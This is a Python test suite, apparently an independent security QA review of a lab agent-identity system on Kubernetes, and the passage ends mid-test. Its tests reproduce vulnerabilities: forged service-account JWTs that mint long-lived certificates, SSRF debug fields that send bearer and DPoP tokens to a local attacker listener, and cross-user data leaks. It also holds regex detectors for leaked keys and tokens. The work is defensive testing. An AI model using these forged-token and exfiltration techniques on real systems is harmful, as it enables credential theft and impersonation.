"""Independent QA & Security Verification Suite for Milestone 2 (`lineage/agents/`, `lineage/k8s/`).

Author : `k8s-qa-reviewer` (Independent Read-Only Code Quality & System Compliance Session)
Scope  :
  1. Baseline & artifact redaction checks (`README.md`, `lab/`, `src/`, `runs/20261118T142439Z/`)
  2. Read-only live Kubernetes (`kind-agent-identity-lab`) topology, socket & volume-mount inspection
  3. Live host Ollama (`qwen2.5:3b`) inference & structured JSON / `tool_calls` verification
  4. `FederationCAService` & `K8sServiceAccountVerifier` boundary & authorization tests
  5. Loopback port/secret isolation (`127.0.0.1` + `X-LCT-Loopback-Auth`) & MCP parameter bounds
  6. Public A2A debug-switch exposure (`sync_hook_url`, `override_direct_parent_url`,
     `inspect_inbox`, `simulate_primary_zombie_delay_sec`) & unauthenticated audit dump verification
"""

from __future__ import annotations

import glob
import json
import os
import re
import subprocess
import threading
import time
import unittest
from pathlib import Path
from typing import Any, Dict, List, Tuple

import httpx
import yaml

from lineage.agents.mcp_servers import PaymentVaultMCPApp, TravelOpsMCPApp
from lineage.agents.ollama_client import OllamaClient, OllamaError, _extract_json_object
from lineage.agents.specialist_apps import (
    FlightSpecialistApp,
    HotelSpecialistApp,
    OrchestratorAlphaApp,
    SettlementConvergerApp,
)
from lineage.audit import AuditCollectorClient, AuditCollectorService, AuditStreamEmitter
from lineage.common.crypto import KeyPair, jws_sign_compact
from lineage.common.http_utils import HTTPRequestContext, ManagedHTTPService
from lineage.identity import TrustBundleResolver, TrustDomainCA
from lineage.k8s.bootstrap_services import FederationCAService
from lineage.protocol import PermissionLattice, create_dpop_proof, mint_root_token
from lineage.registry import AgentCard, AgentDirectoryClient, AgentDirectoryService
from lineage.resilience.receipts import FailureEvidence, FaultType, SkipLevelReceipt
from lineage.revocation import RevocationReplicaClient, RevocationService
from lineage.sidecar import LineageSidecar
from lineage.verifier import VerificationMode

REPO_ROOT = Path("/Users/hulalala/Desktop/A")
RUN_DIR = REPO_ROOT / "lineage/k8s/runs/20261118T142439Z"
MANIFEST_DATA_PLANE = REPO_ROOT / "lineage/k8s/manifests/02-data-plane-agents-and-mcp.yaml"


class _DeterministicStubOllama(OllamaClient):
    """Fast local deterministic subclass of OllamaClient for isolated protocol-boundary unit tests."""

    def __init__(self) -> None:
        super().__init__(base_url="http://127.0.0.1:9/v1", model="qwen2.5:3b")

    def chat_json(
        self,
        system_prompt: str,
        user_prompt: str,
        temperature: float = 0.0,
        max_tokens: int = 256,
    ) -> Tuple[Dict[str, Any], Dict[str, Any]]:
        meta = {
            "endpoint": "stub://ollama",
            "model": "qwen2.5:3b",
            "completion_id": "chatcmpl-qa",
            "system_fingerprint": "fp_ollama",
            "prompt_tokens": 20,
            "completion_tokens": 10,
            "total_tokens": 30,
            "latency_ms": 1.0,
        }
        if "audit_tag" in system_prompt:
            return {"audit_tag": "AUDIT-TOKYO-QA"}, meta
        return {"city": "Tokyo", "flight_budget_usd": 650.0, "hotel_budget_usd": 420.0}, meta

    def chat_tool_call(
        self,
        system_prompt: str,
        user_prompt: str,
        tools_schema: List[Dict[str, Any]],
        temperature: float = 0.0,
        max_tokens: int = 220,
    ) -> Tuple[str, Dict[str, Any], Dict[str, Any]]:
        fn = tools_schema[0]["function"]["name"]
        meta = {
            "endpoint": "stub://ollama",
            "model": "qwen2.5:3b",
            "completion_id": "chatcmpl-qa-tool",
            "system_fingerprint": "fp_ollama",
            "finish_reason": "tool_calls",
        }
        if fn == "search_hotel":
            return fn, {"city": "Tokyo"}, meta
        if fn == "reserve_hotel":
            return fn, {"city": "Tokyo", "hotel_id": "HTL-TYO-09", "amount": 360.0}, meta
        if fn == "search_flight":
            return fn, {"city": "Tokyo"}, meta
        return fn, {"city": "Tokyo", "flight_no": "NH-108", "amount": 580.0}, meta

    def chat_text(
        self,
        system_prompt: str,
        user_prompt: str,
        temperature: float = 0.0,
        max_tokens: int = 320,
    ) -> Tuple[str, Dict[str, Any]]:
        return "Confirmed QA settlement.", {"model": "qwen2.5:3b", "completion_id": "chatcmpl-qa-txt"}


class TestMilestone2QAReview(unittest.TestCase):
    """Independent verification suite covering Milestone 2 positive controls & security findings."""

    # -------------------------------------------------------------------------
    # 1. Baseline Preservation & Run Output Redaction Compliance
    # -------------------------------------------------------------------------
    def test_01_baseline_preservation_and_run_artifact_redaction(self) -> None:
        lineage_init_mtime = (REPO_ROOT / "lineage/__init__.py").stat().st_mtime
        modified_baseline: List[str] = []
        for target in (REPO_ROOT / "README.md", REPO_ROOT / "lab", REPO_ROOT / "src"):
            if target.is_file():
                if target.stat().st_mtime > lineage_init_mtime:
                    modified_baseline.append(str(target))
            else:
                for root, _, files in os.walk(target):
                    for fname in files:
                        fpath = Path(root) / fname
                        if fpath.stat().st_mtime > lineage_init_mtime:
                            modified_baseline.append(str(fpath))
        self.assertEqual(
            modified_baseline,
            [],
            f"Baseline files modified after lineage/__init__.py: {modified_baseline}",
        )

        self.assertTrue(RUN_DIR.is_dir(), f"Missing M2 run evidence dir: {RUN_DIR}")
        artifact_files = sorted(glob.glob(str(RUN_DIR / "*")))
        self.assertGreaterEqual(len(artifact_files), 14)

        for fpath_str in artifact_files:
            content = Path(fpath_str).read_text(encoding="utf-8", errors="replace")
            self.assertNotRegex(
                content,
                r"BEGIN [A-Z ]*PRIVATE KEY",
                f"PEM private key leaked in {fpath_str}",
            )
            self.assertNotRegex(
                content,
                r"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
                f"Unredacted 3-part JWS/JWT leaked in {fpath_str}",
            )
            self.assertNotRegex(
                content,
                r"\blctm?1\.[A-Za-z0-9_.-]{10,}",
                f"Unredacted LCT token leaked in {fpath_str}",
            )
            self.assertNotRegex(
                content,
                r'"(?:d|p|q|dp|dq|qi)"\s*:\s*"(?!\[REDACTED)[A-Za-z0-9_-]{10,}"',
                f"Unredacted JWK private parameter leaked in {fpath_str}",
            )

        before_team1 = (RUN_DIR / "00_team1_before.txt").read_text(encoding="utf-8")
        after_team1 = (RUN_DIR / "99_team1_after.txt").read_text(encoding="utf-8")
        self.assertEqual(before_team1.count("2/2     Running"), 3)
        self.assertEqual(after_team1.count("2/2     Running"), 3)

    # -------------------------------------------------------------------------
    # 2. Live K8s Read-Only Topology, Listener Bounds & SA Token Mount Audit
    # -------------------------------------------------------------------------
    def test_02_k8s_manifest_and_live_cluster_readonly_audit(self) -> None:
        # Static manifest audit for [HIGH-M2-01]: automountServiceAccountToken in 2/2 Deployments
        docs = [d for d in yaml.safe_load_all(MANIFEST_DATA_PLANE.read_text(encoding="utf-8")) if d]
        dual_container_deployments = [
            d
            for d in docs
            if d.get("kind") == "Deployment"
            and len(d["spec"]["template"]["spec"]["containers"]) == 2
        ]
        self.assertEqual(len(dual_container_deployments), 7)

        automount_exposed_deployments: List[str] = []
        for dep in dual_container_deployments:
            pod_spec = dep["spec"]["template"]["spec"]
            # Positive check: emptyDir Memory volume + readOnly on app container
            vols = {v["name"]: v for v in pod_spec.get("volumes", [])}
            self.assertEqual(
                vols["lct-loopback"].get("emptyDir", {}).get("medium"),
                "Memory",
            )
            containers = {c["name"]: c for c in pod_spec["containers"]}
            app_mounts = {m["mountPath"]: m for m in containers["app"].get("volumeMounts", [])}
            self.assertTrue(app_mounts["/var/run/lct-loopback"].get("readOnly") is True)

            if pod_spec.get("automountServiceAccountToken") is not False:
                automount_exposed_deployments.append(dep["metadata"]["name"])

        # [HIGH-M2-01] Confirmed: all 7 dual-container deployments automount SA token into `app`!
        self.assertEqual(len(automount_exposed_deployments), 7)

        # Read-only kubectl check on live cluster if reachable
        env = os.environ.copy()
        env["PATH"] = f"/Users/hulalala/Desktop/A/.tools/bin:{os.path.expanduser('~/.docker/bin')}:{env.get('PATH', '')}"
        res = subprocess.run(
            ["kubectl", "--context", "kind-agent-identity-lab", "get", "pods", "-n", "team1", "--no-headers"],
            env=env,
            capture_output=True,
            text=True,
            timeout=10,
        )
        self.assertEqual(res.returncode, 0, res.stderr)
        team1_lines = [ln for ln in res.stdout.strip().splitlines() if ln.strip()]
        self.assertEqual(len(team1_lines), 3)
        for ln in team1_lines:
            self.assertIn("2/2", ln)
            self.assertIn("Running", ln)

        # Verify live `app` container actually has `/var/run/secrets/kubernetes.io/serviceaccount` mounted
        res_mounts = subprocess.run(
            [
                "kubectl",
                "--context",
                "kind-agent-identity-lab",
                "-n",
                "lineage-alpha",
                "get",
                "pod",
                "-l",
                "app=orchestrator-alpha",
                "-o",
                "jsonpath={.items[0].spec.containers[0].volumeMounts[*].mountPath}",
            ],
            env=env,
            capture_output=True,
            text=True,
            timeout=10,
        )
        self.assertEqual(res_mounts.returncode, 0)
        self.assertIn("/var/run/secrets/kubernetes.io/serviceaccount", res_mounts.stdout)

    # -------------------------------------------------------------------------
    # 3. Live Host Ollama (`qwen2.5:3b`) Real Inference & JSON Parser Boundary
    # -------------------------------------------------------------------------
    def test_03_live_ollama_inference_and_extract_json_error_type(self) -> None:
        client = OllamaClient(base_url="http://127.0.0.1:11434/v1", model="qwen2.5:3b", timeout=30.0)
        plan, meta_json = client.chat_json(
            system_prompt="Reply strictly in JSON with keys city (string) and budget_usd (number).",
            user_prompt="Plan business trip to Tokyo with budget 650 USD.",
        )
        self.assertEqual(meta_json["model"], "qwen2.5:3b")
        self.assertEqual(meta_json["system_fingerprint"], "fp_ollama")
        self.assertGreater(meta_json["total_tokens"], 0)
        self.assertTrue(meta_json["completion_id"].startswith("chatcmpl-"))
        self.assertIn("Tokyo", str(plan.get("city", "")))

        fn_name, fn_args, meta_tool = client.chat_tool_call(
            system_prompt="Always call search_flight for the requested city.",
            user_prompt="Find flights to London.",
            tools_schema=[
                {
                    "type": "function",
                    "function": {
                        "name": "search_flight",
                        "description": "Search flights for destination city.",
                        "parameters": {
                            "type": "object",
                            "properties": {"city": {"type": "string"}},
                            "required": ["city"],
                        },
                    },
                }
            ],
        )
        self.assertEqual(fn_name, "search_flight")
        self.assertIn("London", str(fn_args.get("city", "")))
        self.assertEqual(meta_tool["system_fingerprint"], "fp_ollama")

        # [MEDIUM-M2-02] Malformed brace block raises raw JSONDecodeError (ValueError) instead of OllamaError
        with self.assertRaises(json.JSONDecodeError):
            _extract_json_object("Here is output: {not_valid_json: 123}")

    # -------------------------------------------------------------------------
    # 4 & 5. `FederationCAService` & `K8sServiceAccountVerifier` Boundary Audit
    # -------------------------------------------------------------------------
    def _start_isolated_federation_ca(self) -> Tuple[FederationCAService, KeyPair, AuditCollectorService]:
        k8s_oidc_kp = KeyPair.generate("RS256", kid="k8s-oidc-rs256-test")
        ca_tmp = FederationCAService(audit_collector_url="http://127.0.0.1:9", host="127.0.0.1", port=0)
        collector = AuditCollectorService(trust_resolver=ca_tmp.resolver, host="127.0.0.1", port=0)
        col_url = collector.start()

        ca_svc = FederationCAService(audit_collector_url=col_url, host="127.0.0.1", port=0)
        # Re-register CA public bundles on collector so ROOT_MINT entries verify cleanly
        collector.trust_resolver.register_federation(ca_svc.resolver.export_federation_bundles())

        # Inject verified test JWKS into K8sServiceAccountVerifier (avoiding real K8s API call)
        ca_svc.k8s_verifier._keys_by_kid = {k8s_oidc_kp.kid: k8s_oidc_kp.public_jwk()}
        ca_svc.k8s_verifier._last_refresh = time.time()
        ca_svc.http.start()
        return ca_svc, k8s_oidc_kp, collector

    def test_04_federation_ca_positive_namespace_isolation_and_gateway_gate(self) -> None:
        ca_svc, oidc_kp, collector = self._start_isolated_federation_ca()
        try:
            base = ca_svc.http.base_url
            now = time.time()

            def _make_sa_jwt(ns: str, sa: str) -> str:
                return jws_sign_compact(
                    {
                        "iss": "https://kubernetes.default.svc.cluster.local",
                        "aud": ["https://kubernetes.default.svc.cluster.local"],
                        "sub": f"system:serviceaccount:{ns}:{sa}",
                        "iat": now,
                        "nbf": now,
                        "exp": now + 600.0,
                    },
                    oidc_kp,
                )

            # 1. `lineage-beta/flight-specialist` is strictly bound to `org-beta.io`
            wl_kp = KeyPair.generate("ES256")
            r_beta = httpx.post(
                f"{base}/v1/ca/issue-workload",
                json={"public_jwk": wl_kp.public_jwk()},
                headers={"Authorization": f"Bearer {_make_sa_jwt('lineage-beta', 'flight-specialist')}"},
            )
            self.assertEqual(r_beta.status_code, 200)
            self.assertEqual(
                r_beta.json()["spiffe_id"],
                "spiffe://org-beta.io/ns/lineage-beta/sa/flight-specialist",
            )

            # 2. Outside namespace (`team1`) and unauthorized control-plane SA (`lineage-ctrl/default`) -> 403
            r_team1 = httpx.post(
                f"{base}/v1/ca/issue-workload",
                json={"public_jwk": wl_kp.public_jwk()},
                headers={"Authorization": f"Bearer {_make_sa_jwt('team1', 'weather-coordinator')}"},
            )
            self.assertEqual(r_team1.status_code, 403)

            r_ctrl_def = httpx.post(
                f"{base}/v1/ca/issue-workload",
                json={"public_jwk": wl_kp.public_jwk()},
                headers={"Authorization": f"Bearer {_make_sa_jwt('lineage-ctrl', 'default')}"},
            )
            self.assertEqual(r_ctrl_def.status_code, 403)

            # 3. Non-gateway workload calling `/v1/ca/mint-root-token` -> 403 `gateway_only_endpoint`
            r_mint_denied = httpx.post(
                f"{base}/v1/ca/mint-root-token",
                json={"task_id": "t1"},
                headers={"Authorization": f"Bearer {_make_sa_jwt('lineage-alpha', 'orchestrator-alpha')}"},
            )
            self.assertEqual(r_mint_denied.status_code, 403)
            self.assertEqual(r_mint_denied.json()["error"], "gateway_only_endpoint")
        finally:
            ca_svc.http.stop()
            collector.stop()

    def test_05_federation_ca_jwt_validation_ttl_and_cross_domain_root_mint_findings(self) -> None:
        ca_svc, oidc_kp, collector = self._start_isolated_federation_ca()
        try:
            base = ca_svc.http.base_url
            now = time.time()
            wl_kp = KeyPair.generate("ES256")

            # [HIGH-M2-02A] SA JWT with spoofed issuer, wrong audience, future nbf, and NO `exp` (or `exp: "nan"`) passes!
            sa_no_exp_wrong_iss_aud = jws_sign_compact(
                {
                    "iss": "https://untrusted-issuer.example",
                    "aud": ["some-other-service"],
                    "sub": "system:serviceaccount:lineage-beta:flight-specialist",
                    "nbf": now + 86400.0,
                    "exp": "nan",
                },
                oidc_kp,
            )
            r_bad_jwt = httpx.post(
                f"{base}/v1/ca/issue-workload",
                json={"public_jwk": wl_kp.public_jwk(), "ttl_seconds": 3153600000.0},
                headers={"Authorization": f"Bearer {sa_no_exp_wrong_iss_aud}"},
            )
            # Vulnerability reproduced: 200 OK + 100-year SVID minted!
            self.assertEqual(r_bad_jwt.status_code, 200)
            self.assertGreater(r_bad_jwt.json()["expires_at"] - r_bad_jwt.json()["issued_at"], 1e9)

            # [HIGH-M2-02B] Non-finite string `ttl_seconds: "nan"` causes uncaught CryptoError -> HTTP 500
            r_nan_ttl = httpx.post(
                f"{base}/v1/ca/issue-workload",
                json={"public_jwk": wl_kp.public_jwk(), "ttl_seconds": "nan"},
                headers={"Authorization": f"Bearer {sa_no_exp_wrong_iss_aud}"},
            )
            self.assertEqual(r_nan_ttl.status_code, 500)

            # [HIGH-M2-02C] `lineage-alpha/e2e-user-gateway` (`org-alpha.io`) can mint RootBlock for `org-payment.io`!
            gw_sa = jws_sign_compact(
                {
                    "iss": "https://kubernetes.default.svc.cluster.local",
                    "sub": "system:serviceaccount:lineage-alpha:e2e-user-gateway",
                    "exp": now + 600.0,
                },
                oidc_kp,
            )
            r_foreign_root = httpx.post(
                f"{base}/v1/ca/mint-root-token",
                json={
                    "trust_domain": "org-payment.io",
                    "task_id": "task-cross-domain-mint",
                    "sub": "user:mallory@org-payment.io",
                    "sender_jkt": wl_kp.jkt,
                    "first_hop_spiffe_id": "spiffe://org-payment.io/ns/lineage-pay/sa/settlement-converger",
                    "first_hop_jkt": wl_kp.jkt,
                    "permissions": PermissionLattice.create(
                        tools=["execute_settlement"],
                        max_amount=9999.0,
                        allowed_targets=["airline-escrow"],
                        max_calls=5,
                    ).to_dict(),
                },
                headers={"Authorization": f"Bearer {gw_sa}"},
            )
            self.assertEqual(r_foreign_root.status_code, 200)

            # Malformed `trust_domain` crashes `/v1/ca/mint-root-token` with HTTP 500
            r_unknown_td = httpx.post(
                f"{base}/v1/ca/mint-root-token",
                json={"trust_domain": "nonexistent.io"},
                headers={"Authorization": f"Bearer {gw_sa}"},
            )
            self.assertEqual(r_unknown_td.status_code, 500)
        finally:
            ca_svc.http.stop()
            collector.stop()

    # -------------------------------------------------------------------------
    # 6. Loopback Auth Enforcement & MCP Parameter Validation Boundaries
    # -------------------------------------------------------------------------
    def test_06_loopback_auth_guard_and_mcp_amount_bounds(self) -> None:
        secret = "loopback-secret-qa-256bit-test-value"
        travel_mcp = TravelOpsMCPApp(loopback_secret=secret, port=0)
        pay_mcp = PaymentVaultMCPApp(loopback_secret=secret, port=0)
        t_url = travel_mcp.start()
        p_url = pay_mcp.start()
        try:
            # Positive check: missing or wrong `X-LCT-Loopback-Auth` blocked with 403
            r_no_auth = httpx.post(f"{t_url}/mcp", json={"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
            self.assertEqual(r_no_auth.status_code, 403)
            r_bad_auth = httpx.post(
                f"{p_url}/mcp",
                json={"jsonrpc": "2.0", "id": 1, "method": "tools/call"},
                headers={"X-LCT-Loopback-Auth": "wrong-secret"},
            )
            self.assertEqual(r_bad_auth.status_code, 403)

            # [MEDIUM-M2-02] `TravelOpsMCPApp` accepts `amount=0.0` (or negative) on `book_flight`
            r_zero = httpx.post(
                f"{t_url}/mcp",
                headers={"X-LCT-Loopback-Auth": secret, "X-LCT-Task-Id": "t-zero", "X-LCT-Sub": "user:a@org-alpha.io"},
                json={
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": {"name": "book_flight", "arguments": {"city": "Tokyo", "amount": 0.0}},
                },
            )
            self.assertEqual(r_zero.status_code, 200)
            self.assertEqual(r_zero.json()["result"]["data"]["charged_usd"], 0.0)
        finally:
            travel_mcp.stop()
            pay_mcp.stop()

    # -------------------------------------------------------------------------
    # 7. Public A2A Debug Switches (SSRF, Token Exfil, Cross-User Leak, Double-Book)
    # -------------------------------------------------------------------------
    def test_07_public_a2a_debug_switches_and_unauthenticated_audit_dump(self) -> None:
        ca_alpha = TrustDomainCA("org-alpha.io")
        ca_beta = TrustDomainCA("org-beta.io")
        ca_pay = TrustDomainCA("org-payment.io")
        resolver = TrustBundleResolver()
        for ca in (ca_alpha, ca_beta, ca_pay):
            resolver.register_domain_ca(ca)

        rev_id = ca_alpha.issue_workload("/ns/sys/sa/revocation")
        rev_svc = RevocationService(rev_id, resolver, host="127.0.0.1", port=0)
        rev_url = rev_svc.start()

        collector = AuditCollectorService(resolver, host="127.0.0.1", port=0)
        audit_url = collector.start()

        rev_for_dir = RevocationReplicaClient(rev_url, resolver)
        dir_svc = AgentDirectoryService(resolver, revocation_replica=rev_for_dir, host="127.0.0.1", port=0)
        dir_url = dir_svc.start()

        stub_llm = _DeterministicStubOllama()
        services_to_stop: List[Any] = [rev_svc, collector, dir_svc]

        def _make_dual_node(ca: TrustDomainCA, path: str, skill: str, prio: int, app_factory: Any) -> Tuple[Any, LineageSidecar, AgentCard]:
            sec = f"sec-{path.replace('/', '-')}-padding-256bit"
            wl_id = ca.issue_workload(path)
            rev_rep = RevocationReplicaClient(rev_url, resolver)
            dir_cli = AgentDirectoryClient(dir_url, resolver)
            aud_em = AuditStreamEmitter(wl_id, AuditCollectorClient(audit_url), stream_id=f"{wl_id.spiffe_id}#qa")

            # Bind sidecar first to know outbound_url, then bind app on 127.0.0.1:0
            app_holder: Dict[str, Any] = {}
            sidecar = LineageSidecar(
                identity=wl_id,
                trust_resolver=resolver,
                app_upstream_url="http://127.0.0.1:9",
                loopback_secret=sec,
                mode=VerificationMode.ADAPTIVE_RISK_ANCHORED,
                revocation_replica=rev_rep,
                directory_client=dir_cli,
                audit_emitter=aud_em,
                is_tool_server=(skill == ""),
            )
            in_url, out_url = sidecar.start()
            app_obj = app_factory(sec, out_url)
            app_url = app_obj.start()
            sidecar.app_upstream_url = app_url.rstrip("/")
            services_to_stop.extend([sidecar, app_obj])

            card = None
            if skill:
                card = AgentCard.sign_and_create(
                    identity=wl_id,
                    name=path,
                    endpoint=in_url,
                    return_endpoint=in_url,
                    skills=[skill],
                    priority=prio,
                )
                sidecar.set_agent_card(card)
                dir_cli.register(card)
            return app_obj, sidecar, card  # type: ignore[return-value]

        # Capture SSRF & exfiltrated Authorization/DPoP headers on an attacker listener
        captured_requests: List[Dict[str, Any]] = []
        cap_lock = threading.Lock()

        def _attacker_handler(req: HTTPRequestContext) -> Tuple[int, Any, Dict[str, str]]:
            with cap_lock:
                captured_requests.append(
                    {
                        "path": req.path,
                        "authorization": req.header("Authorization"),
                        "dpop": req.header("DPoP"),
                        "body": req.json() if req.body else {},
                    }
                )
            return 200, {"captured": True}, {}

        attacker_srv = ManagedHTTPService("attacker-listener", _attacker_handler, host="127.0.0.1", port=0)
        attacker_url = attacker_srv.start()
        services_to_stop.append(attacker_srv)

        try:
            travel_app, travel_sc, _ = _make_dual_node(
                ca_pay, "/ns/lineage-pay/sa/travel-ops-mcp", "", 10,
                lambda sec, _out: TravelOpsMCPApp(sec, port=0),
            )
            pay_app, pay_sc, _ = _make_dual_node(
                ca_pay, "/ns/lineage-pay/sa/payment-vault-mcp", "", 10,
                lambda sec, _out: PaymentVaultMCPApp(sec, port=0),
            )
            _, flight_sc, _ = _make_dual_node(
                ca_beta, "/ns/lineage-beta/sa/flight-specialist", "travel.flight", 10,
                lambda sec, out: FlightSpecialistApp(sec, out, f"{travel_sc.inbound_url}/mcp", ollama=stub_llm, port=0),
            )
            _, hotel1_sc, _ = _make_dual_node(
                ca_beta, "/ns/lineage-beta/sa/hotel-specialist-primary", "travel.hotel", 10,
                lambda sec, out: HotelSpecialistApp(sec, out, f"{travel_sc.inbound_url}/mcp", instance_label="primary", ollama=stub_llm, port=0),
            )
            _, hotel2_sc, _ = _make_dual_node(
                ca_beta, "/ns/lineage-beta/sa/hotel-specialist-backup", "travel.hotel", 20,
                lambda sec, out: HotelSpecialistApp(sec, out, f"{travel_sc.inbound_url}/mcp", instance_label="backup", ollama=stub_llm, port=0),
            )
            _, conv_sc, conv_card = _make_dual_node(
                ca_pay, "/ns/lineage-pay/sa/settlement-converger", "settlement.converge", 10,
                lambda sec, out: SettlementConvergerApp(sec, out, f"{pay_sc.inbound_url}/mcp", ollama=stub_llm, port=0),
            )
            _, orch_sc, orch_card = _make_dual_node(
                ca_alpha, "/ns/lineage-alpha/sa/orchestrator-alpha", "travel.orchestrate", 10,
                lambda sec, out: OrchestratorAlphaApp(sec, out, ollama=stub_llm, port=0),
            )

            gw_id = ca_alpha.issue_workload("/ns/lineage-alpha/sa/e2e-user-gateway")
            perms = PermissionLattice.create(
                tools=["search_flight", "book_flight", "search_hotel", "reserve_hotel", "execute_settlement", "record_itinerary_audit"],
                max_amount=800.0,
                allowed_targets=["airline-escrow", "hotel-escrow", "audit-ledger"],
                param_whitelist={"city": ["Tokyo"]},
                max_calls=12,
            )

            # --- [CRITICAL-M2-01A] Public `sync_hook_url` SSRF + `override_direct_parent_url` Token/DPoP Exfiltration ---
            tok_s3 = mint_root_token(
                ca_alpha,
                task_id="task-exfil-qa",
                sub="user:alice@org-alpha.io",
                sender_jkt=gw_id.jkt,
                first_hop_spiffe_id=orch_card.spiffe_id,
                first_hop_jkt=orch_card.jkt,
                permissions=perms,
                first_hop_public_jwk=orch_card.public_jwk,
                first_hop_return_endpoint=orch_card.return_endpoint,
            )
            c_tok_s3 = tok_s3.encode_compact()
            r_exfil = httpx.post(
                f"{orch_sc.inbound_url}/a2a/task",
                json={
                    "op": "delegate_upward_return_chain",
                    "city": "Tokyo",
                    "sync_hook_url": f"{attacker_url}/ssrf-sync-hook",
                    "override_direct_parent_url": attacker_url,
                },
                headers={
                    "Authorization": f"DPoP {c_tok_s3}",
                    "DPoP": create_dpop_proof(gw_id, "POST", f"{orch_sc.inbound_url}/a2a/task", c_tok_s3),
                },
                timeout=15.0,
            )
            self.assertEqual(r_exfil.status_code, 200)
            paths_hit = [x["path"] for x in captured_requests]
            self.assertIn("/ssrf-sync-hook", paths_hit)
            self.assertIn("/v1/task-result", paths_hit)
            exfil_hit = [x for x in captured_requests if x["path"] == "/v1/task-result"][0]
            self.assertTrue(str(exfil_hit["authorization"]).startswith("DPoP lct1."))
            self.assertTrue(str(exfil_hit["dpop"]).startswith("eyJ"))

            # --- [CRITICAL-M2-01B] Cross-User `inspect_inbox` Leaks Victim's SkipLevelReceipt & Raw `lct1.` Token ---
            # Record a real SkipLevelReceipt for Alice on `orchestrator-alpha` (stopping hotel1 briefly so /healthz is down)
            tok_alice_skip = mint_root_token(
                ca_alpha,
                task_id="task-alice-secret-skip",
                sub="user:alice@org-alpha.io",
                sender_jkt=gw_id.jkt,
                first_hop_spiffe_id=orch_card.spiffe_id,
                first_hop_jkt=orch_card.jkt,
                permissions=perms,
                first_hop_public_jwk=orch_card.public_jwk,
                first_hop_return_endpoint=orch_card.return_endpoint,
            )
            t_b2 = tok_alice_skip.attenuate(
                issuer_identity=orch_sc.identity,
                delegate_spiffe_id=hotel1_sc.identity.spiffe_id,
                delegate_jkt=hotel1_sc.identity.jkt,
                permissions=perms,
                hop_segment="HotelB2",
                issuer_return_endpoint=orch_sc.inbound_url,
            )
            t_leaf = t_b2.attenuate(
                issuer_identity=hotel1_sc.identity,
                delegate_spiffe_id=conv_sc.identity.spiffe_id,
                delegate_jkt=conv_sc.identity.jkt,
                permissions=perms,
                hop_segment="LeafC",
                issuer_return_endpoint=hotel1_sc.inbound_url,
            )
            hotel1_old_url = hotel1_sc.inbound_url
            hotel1_sc._inbound_http.stop()
            skip_rec = SkipLevelReceipt.create_and_sign(
                child_identity=conv_sc.identity,
                lineage_token=t_leaf,
                skipped_ancestors=[hotel1_sc.identity.spiffe_id],
                target_ancestor_spiffe_id=orch_sc.identity.spiffe_id,
                failure_evidence=FailureEvidence(
                    failed_spiffe_id=hotel1_sc.identity.spiffe_id,
                    failed_endpoint=hotel1_old_url,
                    fault_type=FaultType.CRASH,
                    error_detail="down",
                    attempt_count=1,
                    observed_at=time.time(),
                ),
                result_payload={"alice_private_note": "CONFIDENTIAL-ITINERARY-9981"},
            )
            c_leaf = t_leaf.encode_compact()
            r_skip = httpx.post(
                f"{orch_sc.inbound_url}/v1/skip-level-return",
                json={"skip_level_receipt": skip_rec.to_dict()},
                headers={
                    "Authorization": f"DPoP {c_leaf}",
                    "DPoP": create_dpop_proof(
                        conv_sc.identity, "POST", f"{orch_sc.inbound_url}/v1/skip-level-return", c_leaf
                    ),
                },
            )
            self.assertEqual(r_skip.status_code, 200)

            # Now User BOB (`user:bob@org-alpha.io`, holding a token ONLY for `task-bob-own`) queries Alice's inbox!
            tok_bob = mint_root_token(
                ca_alpha,
                task_id="task-bob-own",
                sub="user:bob@org-alpha.io",
                sender_jkt=gw_id.jkt,
                first_hop_spiffe_id=orch_card.spiffe_id,
                first_hop_jkt=orch_card.jkt,
                permissions=perms,
            )
            c_bob = tok_bob.encode_compact()
            r_bob_steal = httpx.post(
                f"{orch_sc.inbound_url}/a2a/task",
                json={"op": "inspect_inbox", "inspect_task_id": "task-alice-secret-skip"},
                headers={
                    "Authorization": f"DPoP {c_bob}",
                    "DPoP": create_dpop_proof(gw_id, "POST", f"{orch_sc.inbound_url}/a2a/task", c_bob),
                },
            )
            self.assertEqual(r_bob_steal.status_code, 200)
            stolen_skips = r_bob_steal.json()["skip_level_results"]
            self.assertEqual(len(stolen_skips), 1)
            self.assertEqual(
                stolen_skips[0]["result_payload"]["alice_private_note"],
                "CONFIDENTIAL-ITINERARY-9981",
            )
            self.assertTrue(stolen_skips[0]["compact_lineage_token"].startswith("lct1."))

            # --- [MEDIUM-M2-01] Unauthenticated `GET /v1/audit/entries` Dumps Raw `lct1.` Tokens ---
            r_unauth_audit = httpx.get(f"{audit_url}/v1/audit/entries")
            self.assertEqual(r_unauth_audit.status_code, 200)
            self.assertRegex(r_unauth_audit.text, r"\blct1\.[A-Za-z0-9_.-]{20,}")

            # --- [CRITICAL-M2-01C] `simulate_primary_zombie_delay_sec` < `hotel_timeout_sec` Causes Double Hotel Booking ---
            hotel1_sc._inbound_http.start()
            # Re-register hotel1 card on its newly bound ephemeral port
            card_h1_new = AgentCard.sign_and_create(
                identity=hotel1_sc.identity,
                name="hotel-primary-restarted",
                endpoint=hotel1_sc.inbound_url,
                return_endpoint=hotel1_sc.inbound_url,
                skills=["travel.hotel"],
                priority=10,
                version=int(time.time() * 1000) + 50,
            )
            hotel1_sc.set_agent_card(card_h1_new)
            AgentDirectoryClient(dir_url, resolver).register(card_h1_new)

            before_bookings = len(travel_app._bookings)
            tok_dbl = mint_root_token(
                ca_alpha,
                task_id="task-unrevoked-double-book",
                sub="user:alice@org-alpha.io",
                sender_jkt=gw_id.jkt,
                first_hop_spiffe_id=orch_card.spiffe_id,
                first_hop_jkt=orch_card.jkt,
                permissions=perms,
            )
            c_dbl = tok_dbl.encode_compact()
            r_dbl = httpx.post(
                f"{orch_sc.inbound_url}/a2a/task",
                json={
                    "op": "plan_and_execute_trip",
                    "prompt": "Book Tokyo trip",
                    "hotel_timeout_sec": 10.0,
                    "simulate_primary_zombie_delay_sec": 0.05,
                },
                headers={
                    "Authorization": f"DPoP {c_dbl}",
                    "DPoP": create_dpop_proof(gw_id, "POST", f"{orch_sc.inbound_url}/a2a/task", c_dbl),
                },
                timeout=20.0,
            )
            self.assertEqual(r_dbl.status_code, 200)
            task_hotel_bookings = [
                b for b in travel_app._bookings[before_bookings:]
                if b.get("task_id") == "task-unrevoked-double-book" and "hotel_id" in b
            ]
